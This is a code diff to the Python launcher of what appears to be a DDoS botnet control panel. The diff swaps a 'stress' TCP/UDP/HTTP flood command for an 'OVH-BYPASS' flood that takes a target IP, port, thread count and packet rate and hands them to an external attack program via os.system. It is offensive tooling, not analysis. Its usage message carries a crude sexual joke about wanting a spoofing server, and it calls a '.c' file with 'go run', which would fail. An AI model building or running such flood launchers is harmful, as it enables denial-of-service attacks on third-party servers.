@@ -151,7 +151,7 @@ def special():
                                 \x1b[38;2;0;212;14m╔═══════════════╗
                                 \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mOVH-BYPASS          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
@@ -378,21 +378,18 @@ def main():
 
 # SPECIAL METHODS
 
-        elif "stress" in cnc:
+        elif "OVH-BYPASS" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
-                mode = cnc.split()[3]
-                conn = cnc.split()[4]
-                time = cnc.split()[5]
-                out = cnc.split()[6]
-                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
+                packet_size = cnc.split()[3]
+                threads = cnc.split()[4]
+                pps_limit = cnc.split()[5]
+                time = cnc.split()[6]
+                os.system(f'go run OVH-BYPASS.c {ip} {port} {packet_size} {threads} {pps_limit} {time}')
             except IndexError:
-                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
-                print('MODE: [1] TCP')
-                print('      [2] UDP')
-                print('      [3] HTTP')
-                print('Example: stress 1.1.1.1 80 3 1250 60 5')
+                print('Usage: OVH-BYPASS <target IP> <port> <packet_size> <number threads to use> <pps limiter, -1 for no limit> <time>')
+                print("Africa gimme a spoofed please im down bad i can suck your dick\n")
                 
 # AMP/GAMES METHODS
 
